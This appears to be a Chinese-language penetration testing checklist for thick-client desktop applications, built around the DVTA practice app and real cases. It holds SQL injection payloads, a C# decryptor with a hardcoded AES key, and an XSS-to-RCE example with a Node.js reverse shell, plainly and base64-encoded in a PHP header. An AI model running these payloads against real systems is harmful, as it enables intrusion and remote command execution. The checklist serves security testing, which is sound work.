# **CS-checklist**

<br/>

## 0x00 目录

[TOC]



## 0x01 前言

本项目主要针对pc客户端（cs架构）渗透测试，结合自身测试经验和网络资料形成checklist，如有任何问题，欢迎联系，期待大家贡献更多的技巧和案例。

<br/>

## **0x02 概述**

PC客户端，有丰富功能的gui，c-s架构。

![cs00](https://github.com/theLSA/cs-checklist/raw/master/demo/cs00.png)

//图片源自:

[https://resources.infosecinstitute.com/practical-thick-client-application-penetration-testing-using-damn-vulnerable-thick-client-app-part-1/#article](#article)

<br/>

## **0x03 开发语言**

C#(.NET)，JAVA，DELPHI，C，C++......

<br/> 

## **0x04 协议**

TCP、HTTP(S)，TDS......

<br/> 

## **0x05 数据库**

oracle，mssql，db2......

<br/> 

## **0x06 测试工具**

dvta： pc客户端靶场

ida pro： 静态分析工具

ollydbg：动态分析工具

CFF Explorer：PE文件分析

PEID：查壳工具

exeinfope/studype：pe文件分析

wireshark：观察流量

tcpview：观察tcp流量

echo Mirage：可拦截tcp流量

burpsuite：http(s)抓包

proxifier：全局代理流量

procmon：文件和注册表监控

regshot：注册表变化对比

process Hacker：进程分析

RegfromApp：注册表监控

WSExplorer：岁月联盟进程抓包工具

strings：查看程序的字符串

<br/> 

.net[反]编译：

dotpeek

de4dot

dnspy

ilspy

sae

ildasm

ilasm

<br/> 

Java反编译

jad

jd-gui

jadx

dex2jar

在线版：<br/>
[javare.cn]()

www.javadecompilers.com

<br/>

Reflexil：组装编辑器（可以作为ilspy插件）

Vcg：自动化代码审计工具

BinScope：二进制分析工具

<br/> 

## **0x07 代理设置**

大部分客户端没有代理配置功能，需要自行设置全局代理，如下两种方法：

1）IE-internet设置-连接-局域网设置。

2）proxifier-proxy server/proxification rules

//http的流量可以结合burpsuite方便测试（proxy server设置为burp代理地址）。

<br/> 

## **0x08 测试点**

<br/> 

### **0.** **信息收集**

编译信息，开发环境/语言，使用协议，数据库，ip，混淆/加密，是否加壳等。

<br/>

案例0-CFF查看客户端信息（如编译环境）

dvta

![cs01](https://github.com/theLSA/cs-checklist/raw/master/demo/cs01.png)

<br/><br/> 

### **1.** **逆向工程**

反编译，源代码泄露，硬编码key/password，加解密逻辑，角色判断逻辑（0-admin，1-normaluser），后门等。 

<br/>

案例0-反编译获取加解密逻辑并编写解密工具

dvta

![cs02](https://github.com/theLSA/cs-checklist/raw/master/demo/cs02.png)

通过该逻辑和获取的信息

![cs03](https://github.com/theLSA/cs-checklist/raw/master/demo/cs03.png)

**Encrypted Text:** CTsvjZ0jQghXYWbSRcPxpQ==

**AES KEY:** J8gLXc454o5tW2HEF7HahcXPufj9v8k8

**IV:** fq20T0gMnXa6g0l4

编写解密工具

`using System;`
`using System.Collections.Generic;`
`using System.ComponentModel;`
`using System.Data;`

`using System.Drawing;`

`using System.Linq;`

`using System.Text;`

`using System.Threading.Tasks;`

`using System.Windows.Forms;`

`using System.Security.Cryptography;`

`namespace aesdecrypt`

`{`

​    `public partial class aesdecrypt : Form`

​    `{`

​        `public aesdecrypt()`

​        `{`

​            `InitializeComponent();`

​        `}`

​        `private void decrypt(object sender, EventArgs e)`

​        `{`

​            `String key = “J8gLXc454o5tW2HEF7HahcXPufj9v8k8”;`

​            `String IV = “fq20T0gMnXa6g0l4”;`

​            `String encryptedtext = “CTsvjZ0jQghXYWbSRcPxpQ==”;`

​            `byte[] encryptedBytes = Convert.FromBase64String(encryptedtext);`

​            `AesCryptoServiceProvider aes = new AesCryptoServiceProvider();`

​            `aes.BlockSize = 128;`

​            `aes.KeySize = 256;`

​            `aes.Key = System.Text.ASCIIEncoding.ASCII.GetBytes(key);`

​            `aes.IV = System.Text.ASCIIEncoding.ASCII.GetBytes(IV);`

​            `aes.Padding = PaddingMode.PKCS7;`

​            `aes.Mode = CipherMode.CBC;`

​            `ICryptoTransform crypto = aes.CreateDecryptor(aes.Key, aes.IV);`

​            `byte[] decryptedbytes = crypto.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);`

​            `String decryptedString = System.Text.ASCIIEncoding.ASCII.GetString(decryptedbytes);`

​            `Console.WriteLine(“\n”);`

​            `Console.WriteLine(“##########Decryptig Database password##########\n”);`

​            `Console.WriteLine(“Decrypted Database password:” + decryptedString+”\n”);`

​            `Console.WriteLine(“##########Done##########\n”);`

​        `}`

​    `}`

`}`

//解密代码源自https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article

<br/>

案例1-反编译修改代码逻辑让普通用户以管理员登录

dvta

1-Isadmin

0-Normaluser

改1为0即可判断为admin

![cs04](https://github.com/theLSA/cs-checklist/raw/master/demo/cs04.png)

![cs05](https://github.com/theLSA/cs-checklist/raw/master/demo/cs05.png)

<br/><br/>

### **2.** **信息泄露**

明文敏感信息，敏感文件（如安装目录下的xxx.config）。

注册表：利用regshot比较客户端运行（如登录）前后注册表差别。 

开发调试日志泄露（如dvta.exe >> log.txt）

process hacker查看客户端内存中的明文敏感数据（如账号密码/key）。

strings直接查看客户端字符串（如ip信息）。

查看源代码（如github,gitee等）

<br/>

案例0-配置敏感信息泄露

dvta

![cs06](https://github.com/theLSA/cs-checklist/raw/master/demo/cs06.png)

<br/>

案例1-内存泄露数据库账号密码

dvta

![cs07](https://github.com/theLSA/cs-checklist/raw/master/demo/cs07.png)

<br/>

案例2-源代码含有硬编码ftp账号密码

dvta

![cs08](https://github.com/theLSA/cs-checklist/raw/master/demo/cs08.png)

<br/> 

案例3-开发调试日志泄露

dvta

![cs09](https://github.com/theLSA/cs-checklist/raw/master/demo/cs09.png)

<br/>

案例4-某系统登录后本地保存账号密码

![cs10](https://github.com/theLSA/cs-checklist/raw/master/demo/cs10.png)

//本案例来源于https://blog.csdn.net/weixin_30685047/article/details/95916065

<br/><br/> 

### **3.** **传输流量**

wireshark/echo Mirage/burpsuite+nopeproxy/fillder/charles

ftp等协议明文传输的账号密码

SQL语句明文传输（如利用构造注入，越权等）

<br/>

案例0-正方教务系统sql语句明文传输，返回明文数据

![cs11](https://github.com/theLSA/cs-checklist/raw/master/demo/cs11.png)

![cs12](https://github.com/theLSA/cs-checklist/raw/master/demo/cs12.png)

//本案例来源于wooyun

<br/><br/>

### **4.** **其他漏洞**

#### **爆破**

如登录功能

<br/> 

#### **用户名枚举**

案例0

![cs13](https://github.com/theLSA/cs-checklist/raw/master/demo/cs13.png)

![cs14](https://github.com/theLSA/cs-checklist/raw/master/demo/cs14.png)

<br/>

#### **SQL语句暴露**

案例0

![cs15](https://github.com/theLSA/cs-checklist/raw/master/demo/cs15.png)

<br/>

#### **SQL注入**

如登录处，万能密码

xxx’ or ‘x’=’x

xxx’ or 1=1--

输入框处，构造闭合报错，如’、’)、%’)、order by 100--等。

利用显示位或报错注出数据，原理同web注入，不同数据库大同小异。

<br/> 

案例0-oracle注入

' union select null,null,(select user from dual),null,null,(select banner from sys.v_$version where 	rownum=1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from dual--

![cs16](https://github.com/theLSA/cs-checklist/raw/master/demo/cs16.png)

<br/>

案例1-mssql注入

111') and (select user)>0--

![cs17](https://github.com/theLSA/cs-checklist/raw/master/demo/cs17.png)

<br/>

#### **CSV注入**

如导出excel，输入1+1，导出后看是否为2。

<br/> 

#### **弱口令**

可尝试admin 123456等。

<br/>

#### **XSS**

如Electron，NodeWebKit等。

<br/> 

案例0-中国蚁剑xss到rce

环境：win7+phpstudy(php5.6.27-nts)+perl+nc+antsword2.0.5

xss webshell：

`<?php`

`header('HTTP/1.1 500 <img src=# onerror=alertx>');`

![cs18](https://github.com/theLSA/cs-checklist/raw/master/demo/cs18.png)

Win+node.js:

成功

`var net = require("net"), sh = require("child_process").exec("cmd.exe");`

`var client = new net.Socket();`

`client.connect(6677, "127.0.0.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);`

`sh.stderr.pipe(client);});`

 

`<?php`

`header("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg2Njc3LCAiMTI3LjAuMC4xIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKc2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=`,`base64`).toString())'>");`

`?>`

![cs19](https://github.com/theLSA/cs-checklist/raw/master/demo/cs19.png)

相关参考

https://www.anquanke.com/post/id/176379

<br/> 

#### **命令执行**
<br/>
案例0-印象笔记windows客户端6.15本地文件读取和远程命令执行 

[http://blog.knownsec.com/2018/11/%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0-windows-%E5%AE%A2%E6%88%B7%E7%AB%AF-6-15-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/](http://blog.knownsec.com/2018/11/印象笔记-windows-客户端-6-15-本地文件读取和远程命令执行/)

<br/> 

案例1-某云pc客户端命令执行挖掘过程 

https://www.secpulse.com/archives/53852.html

<br/> 

案例2-金山WPS Mail邮件客户端远程命令执行漏洞(Mozilla系XUL程序利用技巧) 

https://shuimugan.com/bug/view?bug_no=193117

<br/> 

#### **逻辑缺陷**

测试点同web。

<br/>  

#### **密码明文传输** 

<br/> 

#### **DLL劫持**

Linux文件搜索顺序：

1. 当前目录

2. PATH顺序值目录

<br/>

程序搜索Dll顺序：

//没提供绝对路径

1.应用程序加载的目录。

2.当前目录。

3.系统目录 (C:\\Windows\\System32\\)。

4.16位的系统目录。

5.Windows目录。

6.PATH变量的目录。

程序可以加载攻击者放置的恶意dll。

利用procmon搜索程序加载的dll，观察name not found。

msf生成恶意dll放置于程序加载位置，运行程序即可触发payload。

<br/> 

案例0-dll劫持

dvta

![cs20](https://github.com/theLSA/cs-checklist/raw/master/demo/cs20.png)

![cs21](https://github.com/theLSA/cs-checklist/raw/master/demo/cs21.png)

<br/>

#### **授权认证缺陷**

注册表键值，授权服务器返回信息构造。

相关参考

https://cloud.tencent.com/developer/article/1430899

<br/> 

#### **越权**

<br/> 

#### **未授权**

<br/> 

案例0-正方教务系统数据库任意操作

知道ip即可接管数据库

![cs22](https://github.com/theLSA/cs-checklist/raw/master/demo/cs22.png)

//本案例来源于wooyun

<br/>

#### **溢出**

<br/><br/>

## **0x09 相关技巧**

1.wireshark直接过滤出服务器或数据库的ip或协议方便查看，如

ip.addr == 1.2.3.4&&http

2.如果有数据库账号，可以用数据库监控sql语句操作（如sql server profiler）。

<br/><br/> 

## **0x0a 参考资料&&相关资源**

[https://resources.infosecinstitute.com](https://resources.infosecinstitute.com/)

